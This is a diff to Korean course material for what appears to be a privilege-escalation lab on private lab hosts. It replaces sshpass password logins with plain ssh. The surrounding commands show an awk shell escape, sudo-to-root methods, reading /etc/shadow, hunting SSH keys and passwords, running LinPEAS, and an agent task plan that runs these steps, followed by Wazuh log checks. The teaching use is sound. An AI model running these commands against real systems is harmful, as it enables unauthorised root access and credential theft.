@@ -276,7 +276,7 @@ sudo awk 'BEGIN{system("/bin/sh")}'
 
 ```bash
 # web 서버에서 SUID 바이너리 탐색
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "find / -perm -4000 -type f 2>/dev/null | sort"
 # 예상 출력:
 # /usr/bin/chfn
@@ -314,17 +314,17 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
 
 ```bash
 # SGID 바이너리 탐색
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "find / -perm -2000 -type f 2>/dev/null | sort"
 
 # Capabilities 확인
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "getcap -r / 2>/dev/null"
 # 예상 출력:
 # /usr/bin/ping cap_net_raw=ep
 
 # 특히 위험한 capabilities 확인
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "getcap -r / 2>/dev/null | grep -E 'setuid|dac_read|sys_admin|net_admin'"
 ```
 
@@ -343,19 +343,19 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
 
 ```bash
 # web 서버에서 sudo 설정 확인
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S -l 2>/dev/null"
 # 예상 출력:
 # User web may run the following commands on web:
 #     (ALL) NOPASSWD: ALL
 
 # NOPASSWD: ALL이 설정되어 있으므로 즉시 root 가능
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S id 2>/dev/null"
 # 예상 출력: uid=0(root) gid=0(root) groups=0(root)
 
 # root 셸 획득 확인
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S whoami 2>/dev/null"
 # 예상 출력: root
 ```
@@ -381,27 +381,27 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
 
 ```bash
 # 방법 1: sudo su (가장 직접적)
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S su -c 'id' 2>/dev/null"
 # 예상 출력: uid=0(root) gid=0(root) groups=0(root)
 
 # 방법 2: sudo /bin/bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S /bin/bash -c 'id && whoami' 2>/dev/null"
 # 예상 출력: uid=0(root)... root
 
 # 방법 3: sudo python3
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S python3 -c 'import os; os.system(\"id\")' 2>/dev/null"
 # 예상 출력: uid=0(root)
 
 # 방법 4: sudo find
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S find /tmp -maxdepth 0 -exec id \; 2>/dev/null"
 # 예상 출력: uid=0(root)
 
 # 방법 5: sudo env
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S env id 2>/dev/null"
 # 예상 출력: uid=0(root)
 ```
@@ -418,20 +418,20 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
 
 ```bash
 # root로 shadow 파일 읽기
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S cat /etc/shadow 2>/dev/null | grep -v '^[!*]' | grep -v 'nobody'"
 # 예상 출력: 실제 비밀번호 해시가 있는 사용자 목록
 
 # SSH 키 확인
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S find /home -name 'id_rsa' -o -name 'authorized_keys' 2>/dev/null"
 
 # 서비스 설정 파일 (비밀번호 포함 가능)
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S grep -r 'password\|passwd\|secret\|key' /etc/ 2>/dev/null | grep -v Binary | head -20"
 
 # cron job 확인
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S cat /etc/crontab 2>/dev/null; echo 1 | sudo -S ls -la /etc/cron.d/ 2>/dev/null"
 ```
 
@@ -457,8 +457,8 @@ if [ ! -f /tmp/linpeas.sh ]; then
 fi
 
 # web 서버로 LinPEAS 전송 및 실행
-sshpass -p1 scp -o StrictHostKeyChecking=no /tmp/linpeas.sh ccc@10.20.30.80:/tmp/ 2>/dev/null
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+scp /tmp/linpeas.sh ccc@10.20.30.80:/tmp/ 2>/dev/null
+ssh ccc@10.20.30.80 \
   "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh 2>/dev/null" | head -100
 # 예상 출력:
 # ==========+ System Information +==========
@@ -485,7 +485,7 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
 > **배우는 것**: 수동 열거 기법과 자동화 도구의 차이
 
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 << 'ENUM'
+ssh ccc@10.20.30.80 << 'ENUM'
 echo "=== 시스템 정보 ==="
 uname -a
 cat /etc/os-release | head -3
@@ -539,16 +539,16 @@ echo 1 | sudo -S nmap -sV -p 22,80,3000 10.20.30.80 2>/dev/null | grep "open"
 
 # Phase 2: 취약점 활용 — 패스워드 공격 (Week 04)
 echo "[Phase 2] SSH 접근 (약한 비밀번호)"
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 "echo '[Phase 2] 접근 성공: $(whoami)@$(hostname)'"
+ssh ccc@10.20.30.80 "echo '[Phase 2] 접근 성공: $(whoami)@$(hostname)'"
 
 # Phase 3: 권한 상승 (Week 05)
 echo "[Phase 3] 권한 상승"
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S bash -c 'echo \"[Phase 3] 권한 상승 성공: \$(whoami)\"' 2>/dev/null"
 
 # Phase 4: 민감 정보 수집
 echo "[Phase 4] 민감 정보 수집"
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S bash -c '
     echo \"--- shadow 해시 ---\"
     cat /etc/shadow 2>/dev/null | grep -E \"^(web|root):\" | cut -d: -f1-2
@@ -582,10 +582,10 @@ curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
   -H "X-API-Key: bastion-api-key-2026" \
   -d '{
     "tasks": [
-      {"order":1,"title":"SUID 바이너리 탐색","instruction_prompt":"sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \"find / -perm -4000 -type f 2>/dev/null\"","risk_level":"low","subagent_url":"http://localhost:8002"},
-      {"order":2,"title":"sudo 설정 확인","instruction_prompt":"sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \"echo 1 | sudo -S -l 2>/dev/null\"","risk_level":"low","subagent_url":"http://localhost:8002"},
-      {"order":3,"title":"capabilities 확인","instruction_prompt":"sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \"getcap -r / 2>/dev/null\"","risk_level":"low","subagent_url":"http://localhost:8002"},
-      {"order":4,"title":"권한 상승 실행","instruction_prompt":"sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \"echo 1 | sudo -S id 2>/dev/null\"","risk_level":"medium","subagent_url":"http://localhost:8002"}
+      {"order":1,"title":"SUID 바이너리 탐색","instruction_prompt":"ssh ccc@10.20.30.80 \"find / -perm -4000 -type f 2>/dev/null\"","risk_level":"low","subagent_url":"http://localhost:8002"},
+      {"order":2,"title":"sudo 설정 확인","instruction_prompt":"ssh ccc@10.20.30.80 \"echo 1 | sudo -S -l 2>/dev/null\"","risk_level":"low","subagent_url":"http://localhost:8002"},
+      {"order":3,"title":"capabilities 확인","instruction_prompt":"ssh ccc@10.20.30.80 \"getcap -r / 2>/dev/null\"","risk_level":"low","subagent_url":"http://localhost:8002"},
+      {"order":4,"title":"권한 상승 실행","instruction_prompt":"ssh ccc@10.20.30.80 \"echo 1 | sudo -S id 2>/dev/null\"","risk_level":"medium","subagent_url":"http://localhost:8002"}
     ],
     "subagent_url":"http://localhost:8002",
     "parallel":true
@@ -606,11 +606,11 @@ for t in d.get('task_results',[]):
 
 ```bash
 # sudo 사용 로그 확인
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+ssh ccc@10.20.30.80 \
   "echo 1 | sudo -S cat /var/log/auth.log 2>/dev/null | grep sudo | tail -10"
 
 # Wazuh에서 권한 상승 관련 경보 확인
-sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.100 \
+ssh ccc@10.20.30.100 \
   "cat /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep -i 'sudo\|privilege\|escalat' | tail -10"
 ```
 
